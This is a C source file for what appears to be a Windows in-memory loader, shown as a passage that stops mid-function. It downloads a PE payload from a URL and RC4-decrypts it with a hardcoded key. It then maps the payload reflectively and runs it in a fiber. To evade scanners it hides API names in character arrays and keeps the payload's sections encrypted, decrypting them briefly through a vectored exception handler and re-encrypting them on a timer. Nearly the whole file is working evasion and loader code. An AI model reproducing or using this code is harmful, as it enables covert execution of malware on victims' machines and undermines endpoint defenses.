#include <stdio.h>
#include <Windows.h>
#include <math.h>

#include "helpers.h"
#include "antie.h"

#define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %lu\n", cApiName, GetLastError())
#define isDebug 	FALSE
#define EXEC_WAIT 1
#define KEY_SIZE 0x10 // 16

HANDLE g_hTimerQueue = INVALID_HANDLE_VALUE;
HANDLE g_hTimer = INVALID_HANDLE_VALUE;

ULONG_PTR g_uPeTextAddr = 0;
SIZE_T g_sPeTotalSize = 0;

SECTION_DATA g_SectionData[7] = { 0 };


BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
{
	NTSTATUS STATUS = 0;
	BYTE Rc4Key[KEY_SIZE] = { 0xf5,0x51,0xf8,0xd9,0xbb,0x52,0x6f,0x7b,0xfe,0x75,0xfe,0xab,0xa2,0x2a,0x08,0x1a };

	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
	USTRING uStringKey = { .Buffer = Rc4Key, .Length = KEY_SIZE, .MaximumLength = KEY_SIZE };

	char sSystemFunction032[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };

	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

	pSystemFunction032 SystemFunction032 = (pSystemFunction032)hlpGetProcAddress(pLoadLibraryW(L"Advapi32.dll"), sSystemFunction032);

	if (!pBuffer || !dwBufferLen)
		return FALSE;

	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
	{
		PRINT_WINAPI_ERR(sSystemFunction032);
		return FALSE;
	}

	*ppBuffer = uStringBuffer.Buffer;

	return TRUE;
}


BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize)
{
	char cUserAgent[] = { 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '1', '2', '2', '.', '0', '.', '0', '.', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3', '6', '\0' };

	HINTERNET hInternet = NULL;
	HINTERNET hInternetFile = NULL;
	PBYTE lBuffer = NULL;
	PBYTE lTempBuffer = NULL;

	DWORD dwBytesRead = 0;
	SIZE_T totalBytes = 0;

	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	HMODULE winMod = pLoadLibraryW(L"wininet.dll");
	char sInternetCloseHandle[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0' };
	tInternetCloseHandle pInternetCloseHandle = (tInternetCloseHandle)hlpGetProcAddress(winMod, sInternetCloseHandle);


	BOOL isSuccess = TRUE;
	char sInternetOpenA[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A', '\0'};

	tInternetOpenA pInternetOpenA = (tInternetOpenA)hlpGetProcAddress(winMod, sInternetOpenA);
	
	DWORD InternetOpenTypePreConfig = 0;

	if (!(hInternet = pInternetOpenA(cUserAgent, InternetOpenTypePreConfig, NULL, NULL, 0)))
	{
		PRINT_WINAPI_ERR(sInternetOpenA);
		return FALSE;
	}

	char sInternetOpenUrlA[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'U', 'r', 'l', 'A', '\0' };

	tInternetOpenUrlA pInternetOpenUrlA = (tInternetOpenUrlA)hlpGetProcAddress(winMod, sInternetOpenUrlA);

	DWORD InternetFlagSecure = 0x00800000;
	DWORD InternetFlagHyperLink = 0x00000400;
	DWORD InternetFlagNoCacheWrite = 0x04000000;

	if (!(hInternetFile = pInternetOpenUrlA(hInternet, sURL, NULL, 0, InternetFlagSecure | InternetFlagHyperLink | InternetFlagNoCacheWrite, 0)))
	{
		PRINT_WINAPI_ERR(sInternetOpenA);
		if (hInternet)
			pInternetCloseHandle(hInternet);
		if (hInternetFile)
			pInternetCloseHandle(hInternetFile);
		return FALSE;
	}

	lTempBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
	if (!lTempBuffer)
	{
		if (hInternet)
			pInternetCloseHandle(hInternet);
		if (hInternetFile)
			pInternetCloseHandle(hInternetFile);
		return FALSE;
	}


	char sInternetReadFile[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};

	tInternetReadFile pInternetReadFile = (tInternetReadFile)hlpGetProcAddress(winMod, sInternetReadFile);

	while (TRUE)
	{
		if (!pInternetReadFile(hInternetFile, lTempBuffer, 1024, &dwBytesRead))
		{
			PRINT_WINAPI_ERR(sInternetReadFile);
			LocalFree(lBuffer);
			if (hInternet)
				pInternetCloseHandle(hInternet);
			if (hInternetFile)
				pInternetCloseHandle(hInternetFile);
			return FALSE;
		}

		totalBytes += dwBytesRead;

		if (!lBuffer)
		{
			lBuffer = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			lBuffer = (PBYTE)LocalReAlloc(lBuffer, totalBytes, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (!lBuffer)
		{
			if (hInternet)
				pInternetCloseHandle(hInternet);
			if (hInternetFile)
				pInternetCloseHandle(hInternetFile);
			return FALSE;
		}

		memcpy((PVOID)(lBuffer + (totalBytes - dwBytesRead)), lTempBuffer, dwBytesRead);

		memset(lTempBuffer, '\0', dwBytesRead);

		if (dwBytesRead < 1024)
			break;
	}

	char sInternetSetOptionA[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', 'A', '\0' };
	tInternetSetOptionA pInternetSetOptionA = (tInternetSetOptionA)hlpGetProcAddress(winMod, sInternetSetOptionA);

	DWORD InternetOptionSettingsChanged = 39;

	if (!pInternetSetOptionA(NULL, InternetOptionSettingsChanged, NULL, 0))
	{
		PRINT_WINAPI_ERR(sInternetSetOptionA);
		if (hInternet)
			pInternetCloseHandle(hInternet);
		if (hInternetFile)
			pInternetCloseHandle(hInternetFile);
		return FALSE;
	}

	*ppBuffer = lBuffer;
	*pdwFileSize = (DWORD)totalBytes;


	pInternetCloseHandle(hInternet);
	pInternetCloseHandle(hInternetFile);
	//LocalFree(lBuffer);
	LocalFree(lTempBuffer);

	return TRUE;
}


BOOL InitializePeStruct(OUT PPE_HEADERS pPeHeaders, IN PBYTE pFileBuffer, IN DWORD dwFileSize)
{
	if (!pPeHeaders || !pFileBuffer || !dwFileSize)
		return FALSE;

	pPeHeaders->pFileBuffer = pFileBuffer;
	pPeHeaders->dwFileSize = dwFileSize;
	pPeHeaders->pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

	if (pPeHeaders->pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pPeHeaders->bIsDLLFile = (pPeHeaders->pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
	pPeHeaders->pImgSecHdr = IMAGE_FIRST_SECTION(pPeHeaders->pImgNtHdrs);
	pPeHeaders->pEntryImportDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeHeaders->pEntryBaseRelocDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeHeaders->pEntryTLSDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	pPeHeaders->pEntryExceptionDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeHeaders->pEntryExportDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (isDebug)
	{
		printf("PE Base Address:\t%p\n", pFileBuffer);
		printf("PE NT Headers:\t%p\n", pPeHeaders->pImgNtHdrs);
		printf("PE Image Section Headers:\t%p\n", pPeHeaders->pImgSecHdr);
		printf("PE File Header:\t%p\n", &pPeHeaders->pImgNtHdrs->FileHeader);
		printf("PE Optional Header:\t%p\n", &pPeHeaders->pImgNtHdrs->OptionalHeader);
		printf("PE Import Data Dir:\t%p\n", pPeHeaders->pEntryImportDataDir);
		printf("PE Export Data Dir:\t%p\n", pPeHeaders->pEntryExportDataDir);
		printf("PE Base Reloc Dir:\t%p\n", pPeHeaders->pEntryBaseRelocDataDir);
		printf("PE TLS Data Dir:\t%p\n", pPeHeaders->pEntryTLSDataDir);
		printf("PE Exception Data Dir:\t%p\n", pPeHeaders->pEntryExceptionDataDir);
	}

	return TRUE;
}


BOOL FixRelocations(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress)
{
	PIMAGE_BASE_RELOCATION pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);


	ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;

	PBASE_RELOCATION_ENTRY pBaseRelocationEntry = NULL;

	while (pImgBaseRelocation->VirtualAddress)
	{
		pBaseRelocationEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocationEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock)
		{
			switch (pBaseRelocationEntry->Type)
			{
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += uDeltaOffset;
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += (DWORD)uDeltaOffset;
				break;

			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += HIWORD(uDeltaOffset);
				break;

			case IMAGE_REL_BASED_LOW:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += LOWORD(uDeltaOffset);
				break;

			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			default:
				printf("Unknown relocation type %d | Offset: 0x%08X \n", pBaseRelocationEntry->Offset, pBaseRelocationEntry->Offset);
				return FALSE;
			}

			pBaseRelocationEntry++;
		}
		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocationEntry;
	}
	return TRUE;
}

BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress)
{
	PIMAGE_IMPORT_DESCRIPTOR pImgDescriptor = NULL;

	for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{
		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);

		if (pImgDescriptor->OriginalFirstThunk == 0 && pImgDescriptor->FirstThunk == 0)
			break;


		LPSTR cDllName					 = (LPSTR)(pPeBaseAddress + pImgDescriptor->Name);
		ULONG_PTR uOriginalFirstThunkRVA = pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR uFirstThunkRVA		 = pImgDescriptor->FirstThunk;
		SIZE_T ImgThunkSize				 = 0;
		HMODULE hModule					 = NULL;
		tLoadLibraryA pLoadLibraryA = (tLoadLibraryA)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

		if (!(hModule = pLoadLibraryA(cDllName)))
		{
			PRINT_WINAPI_ERR("LoadLibraryA");
			return FALSE;
		}

		while (TRUE)
		{
			PIMAGE_THUNK_DATA pOriginalFirstThunk  = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + ImgThunkSize);
			PIMAGE_THUNK_DATA pFirstThunk		   = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
			ULONG_PTR pFuncAddress				   = 0;

			if (pOriginalFirstThunk->u1.Function == 0 && pFirstThunk->u1.Function == 0)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal))
			{
				
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, MAKEINTRESOURCEA(IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))))
				{
					printf("Could not import !%s#%d\n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			else
			{
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)hlpGetProcAddress(hModule, pImgImportByName->Name)))
				{
					printf("Could not import !%s.%s\n", cDllName, pImgImportByName->Name);
					return FALSE;
				}
			}

			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);

		}
	}
	return TRUE;
}

BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHeaders, IN PIMAGE_SECTION_HEADER pImgSecHeader)
{
	char sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
	tVirtualProtect pVirtualProtect = (tVirtualProtect)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), sVirtualProtect);

	for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++)
	{
		DWORD dwProtection = 0;
		DWORD dwOldProtection = 0;

		if (!pImgSecHeader[i].SizeOfRawData || !pImgSecHeader[i].VirtualAddress)
			continue;

		g_SectionData[i].Address = pPeBaseAddress + pImgSecHeader[i].VirtualAddress;
		g_SectionData[i].Size = pImgSecHeader[i].SizeOfRawData;
		g_SectionData[i].Name = (char *)pImgSecHeader[i].Name;

		g_sPeTotalSize += pImgSecHeader[i].SizeOfRawData;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
		{
			if (!g_uPeTextAddr)
				// save RX base address
				g_uPeTextAddr = pPeBaseAddress + pImgSecHeader[i].VirtualAddress;

			dwProtection = PAGE_EXECUTE_READ;
		}

		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;


		if (!pVirtualProtect((PVOID)(pPeBaseAddress + pImgSecHeader[i].VirtualAddress), pImgSecHeader[i].SizeOfRawData, dwProtection, &dwOldProtection))
		{
			PRINT_WINAPI_ERR(sVirtualProtect);
			return FALSE;
		}
	}

	return TRUE;
}

BOOL SectionRc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN char * pName, IN BOOL bDecrypt)
{
	if (isDebug)
	{
		if (!bDecrypt)
		{
			printf("Encrypting Section: %s\tAddr: %p\tSize: %lu\n", pName, pBuffer, dwBufferLen);
		}
		else
		{
			printf("Decrypting Section: %s\tAddr: %p\tSize: %lu\n", pName, pBuffer, dwBufferLen);
		}
	}

	NTSTATUS STATUS = 0;
	BYTE Rc4Key[KEY_SIZE] = { 0x71,0x84,0x03,0x68,0x6a,0xe6,0xcf,0x8d,0x4a,0x8a,0xff,0x03,0x25,0x23,0x7d,0x75 };
	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
	USTRING uStringKey = { .Buffer = Rc4Key, .Length = KEY_SIZE, .MaximumLength = KEY_SIZE };

	HMODULE kern32 = hlpGetModuleHandle(L"kernel32.dll");

	char sSystemFunction032[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };
	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(kern32, "LoadLibraryW");
	pSystemFunction032 SystemFunction032 = (pSystemFunction032)hlpGetProcAddress(pLoadLibraryW(L"Advapi32.dll"), sSystemFunction032);

	char sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
	tVirtualProtect pVirtualProtect = (tVirtualProtect)hlpGetProcAddress(kern32, sVirtualProtect);

	DWORD dwOldProtection = 0x00;

	if (!pBuffer || !dwBufferLen)
		return FALSE;

	// change permissions to RW to enc / dec
	if (!pVirtualProtect(pBuffer, dwBufferLen, PAGE_READWRITE, &dwOldProtection))
	{
		PRINT_WINAPI_ERR(sVirtualProtect);
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
	{
		PRINT_WINAPI_ERR(sSystemFunction032);
		return FALSE;
	}

	if (_stricmp(pName, ".text") == 0)
	{
		if (!pVirtualProtect(pBuffer, dwBufferLen, (bDecrypt == TRUE ? PAGE_EXECUTE_READ : PAGE_READONLY), &dwOldProtection))
		{
			PRINT_WINAPI_ERR(sVirtualProtect);
			return FALSE;
		}
	}
	else 
	{
		// set mem permission back to old protection
		if (!pVirtualProtect(pBuffer, dwBufferLen, dwOldProtection, &dwOldProtection))
		{
			PRINT_WINAPI_ERR(sVirtualProtect);
			return FALSE;
		}
	}

	return TRUE;
}


// BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL bDecrypt)
// {
// 	if (!bDecrypt)
// 	{
		// printf("Encrypting Addr: %p Size: %d\n", pBuffer, dwBufferLen);
// 	}
// 	else
// 	{
// 		printf("Decrypting Addr: %p Size: %d\n", pBuffer, dwBufferLen);
// 	}

// 	NTSTATUS STATUS = 0;
// 	BYTE Rc4Key[KEY_SIZE] = { 0x71,0x84,0x03,0x68,0x6a,0xe6,0xcf,0x8d,0x4a,0x8a,0xff,0x03,0x25,0x23,0x7d,0x75 };
// 	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
// 	USTRING uStringKey = { .Buffer = Rc4Key, .Length = KEY_SIZE, .MaximumLength = KEY_SIZE };

// 	HMODULE kern32 = hlpGetModuleHandle(L"kernel32.dll");

// 	char sSystemFunction032[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };
// 	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(kern32, "LoadLibraryW");
// 	pSystemFunction032 SystemFunction032 = (pSystemFunction032)hlpGetProcAddress(pLoadLibraryW(L"Advapi32.dll"), sSystemFunction032);

// 	char sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
// 	tVirtualProtect pVirtualProtect = (tVirtualProtect)hlpGetProcAddress(kern32, sVirtualProtect);

// 	DWORD dwOldProtection = 0x00;

// 	if (!pBuffer || !dwBufferLen)
// 		return FALSE;

// 	// change permissions to RW to enc / dec
// 	if (!pVirtualProtect(pBuffer, dwBufferLen, PAGE_READWRITE, &dwOldProtection))
// 	{
// 		PRINT_WINAPI_ERR(sVirtualProtect);
// 		return FALSE;
// 	}

// 	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
// 	{
// 		PRINT_WINAPI_ERR(sSystemFunction032);
// 		return FALSE;
// 	}

// 	// set mem permission back to RO/RX
// 	if (!pVirtualProtect(pBuffer, dwBufferLen, (bDecrypt == TRUE ? PAGE_EXECUTE_READ : PAGE_READONLY), &dwOldProtection))
// 	{
// 		PRINT_WINAPI_ERR(sVirtualProtect);
// 		return FALSE;
// 	}

// 	return TRUE;
// }

VOID CALLBACK FluxTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired)
{
	if (isDebug)
		printf("\n");

	for (int i = 0; i < 7; i++)
	{
		SectionRc4EncryptDecrypt((PBYTE)g_SectionData[i].Address, (DWORD)g_SectionData[i].Size, g_SectionData[i].Name, FALSE);
	}
}

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
{
	printf("[!] Exception raised!\n");
	printf("\t> Status: ");

	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION)
	{
		// make sure exception address is in the headers section of the PE
		if ((ULONG_PTR)(pExceptionInfo->ExceptionRecord->ExceptionAddress) >= g_uPeTextAddr && (ULONG_PTR)(pExceptionInfo->ExceptionRecord->ExceptionAddress) <= (g_uPeTextAddr + (ULONG_PTR)g_sPeTotalSize))
		{
			printf("[*] HANDLED [*] \n");

			if (!g_hTimerQueue || !g_hTimer)
				goto _FAILURE;


			if (isDebug)
				printf("\n");

			for (int i = 0; i < 7; i++)
			{
				if (!SectionRc4EncryptDecrypt((PBYTE)g_SectionData[i].Address, (DWORD)g_SectionData[i].Size, g_SectionData[i].Name, TRUE))
					goto _FAILURE;
			}

			// execute the obfuscationtimercallback func after EXEC_WAIT seconds
			char sCreateTimerQueueTimer[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r', 'Q', 'u', 'e', 'u', 'e', 'T', 'i', 'm', 'e', 'r', '\0' };
			tCreateTimerQueueTimer pCreateTimerQueueTimer = (tCreateTimerQueueTimer)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), sCreateTimerQueueTimer);
			if (!pCreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 500, 0x00, 0x00))
			{
				PRINT_WINAPI_ERR(sCreateTimerQueueTimer);
				goto _FAILURE;
			}

			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	printf("[-] UNHANDLED [-] \n");

_FAILURE:
	return EXCEPTION_CONTINUE_SEARCH;
}



BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
{

	if (!pPeHeaders)
		return FALSE;

	PBYTE pPeBaseAddress = NULL;
	PVOID pEntryPoint = NULL;
	PVOID pVeHandler = NULL;
	
	HMODULE kern32 = hlpGetModuleHandle(L"kernel32.dll");

	char sVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };

	tVirtualAlloc pVirtualAlloc = (tVirtualAlloc)hlpGetProcAddress(kern32, sVirtualAlloc);

	if ((pPeBaseAddress = pVirtualAlloc(NULL, pPeHeaders->pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
	{
		PRINT_WINAPI_ERR(sVirtualAlloc);
		return FALSE;
	}


	if (isDebug)
		printf("[*] Copying sections over [*]\n");

	for (int i = 0; i < pPeHeaders->pImgNtHdrs->FileHeader.NumberOfSections; i++)
	{
		if (isDebug)
			printf("Name: %s \t SRC: %p \t DST: %p\n", pPeHeaders->pImgSecHdr[i].Name, (PVOID)(pPeHeaders->pFileBuffer + pPeHeaders->pImgSecHdr[i].PointerToRawData), (PVOID)(pPeBaseAddress + pPeHeaders->pImgSecHdr[i].VirtualAddress));

		memcpy(
			(PVOID)(pPeBaseAddress + pPeHeaders->pImgSecHdr[i].VirtualAddress),
			(PVOID)(pPeHeaders->pFileBuffer + pPeHeaders->pImgSecHdr[i].PointerToRawData),
			pPeHeaders->pImgSecHdr[i].SizeOfRawData
		);

		if (isDebug)
			printf("\t> Overwriting old %s section with null bytes at addr \t%p\n", pPeHeaders->pImgSecHdr[i].Name, (PVOID)(pPeHeaders->pFileBuffer + pPeHeaders->pImgSecHdr[i].PointerToRawData));

		memset(
			(PVOID)(pPeHeaders->pFileBuffer + pPeHeaders->pImgSecHdr[i].PointerToRawData),
			'\0',
			pPeHeaders->pImgSecHdr[i].SizeOfRawData
		);
	}

	if (!FixRelocations(pPeHeaders->pEntryBaseRelocDataDir, (ULONG_PTR)pPeBaseAddress, pPeHeaders->pImgNtHdrs->OptionalHeader.ImageBase))
		return FALSE;

	if (!FixImportAddressTable(pPeHeaders->pEntryImportDataDir, pPeBaseAddress))
		return FALSE;

	if (!FixMemPermissions((ULONG_PTR)pPeBaseAddress, pPeHeaders->pImgNtHdrs, pPeHeaders->pImgSecHdr))
		return FALSE;

	if (!g_uPeTextAddr || !g_sPeTotalSize)
		return FALSE;

	// set exception handlers
	if (pPeHeaders->pEntryExceptionDataDir->Size)
	{
		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddress + pPeHeaders->pEntryExceptionDataDir->VirtualAddress);
		tRtlAddFunctionTable pRtlAddFunctionTable = (tRtlAddFunctionTable)hlpGetProcAddress(kern32, "RtlAddFunctionTable");

		if (!pRtlAddFunctionTable(pImgRuntimeFuncEntry, (pPeHeaders->pEntryExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), (DWORD64)pPeBaseAddress))
		{
			PRINT_WINAPI_ERR("RtlAddFunctionTable");
			return FALSE;
		}
	}

	// Register a VEH
	tAddVectoredExceptionHandler pAddVectoredExceptionHandler = (tAddVectoredExceptionHandler)hlpGetProcAddress(kern32, "AddVectoredExceptionHandler");
	if (!(pVeHandler = pAddVectoredExceptionHandler(0x01, VectoredExceptionHandler)))
	{
		PRINT_WINAPI_ERR("AddVectoredExceptionHandler");
		return FALSE;
	}

	// Execute TLS callbacks
	if (pPeHeaders->pEntryTLSDataDir->Size)
	{
		PIMAGE_TLS_DIRECTORY pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(pPeBaseAddress + pPeHeaders->pEntryTLSDataDir->VirtualAddress);

		PIMAGE_TLS_CALLBACK* pImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);
		for (int i = 0; pImgTlsCallback[i] != NULL; i++)
		{
			pImgTlsCallback[i]((LPVOID)pPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
		}
	}
	
	pEntryPoint = (PVOID)(pPeBaseAddress + pPeHeaders->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	tCreateTimerQueue pCreateTimerQueue = (tCreateTimerQueue)hlpGetProcAddress(kern32, "CreateTimerQueue");
	if (g_hTimerQueue == INVALID_HANDLE_VALUE)
		g_hTimerQueue = pCreateTimerQueue();

	char sCreateTimerQueueTimer[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r', 'Q', 'u', 'e', 'u', 'e', 'T', 'i', 'm', 'e', 'r', '\0' };
	tCreateTimerQueueTimer pCreateTimerQueueTimer = (tCreateTimerQueueTimer)hlpGetProcAddress(kern32, sCreateTimerQueueTimer);
	if (!pCreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 500, 0x00, 0x00))
	{
		PRINT_WINAPI_ERR(sCreateTimerQueueTimer);
		return FALSE;
	}

	char sCreateFiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };

	tCreateFiber pCreateFiber = (tCreateFiber)hlpGetProcAddress(kern32, sCreateFiber);
	LPVOID fiberAddr = NULL;
	if (!(fiberAddr = pCreateFiber(0, (LPFIBER_START_ROUTINE)pEntryPoint, NULL)))
	{
		PRINT_WINAPI_ERR(sCreateFiber);
		return FALSE;
	}

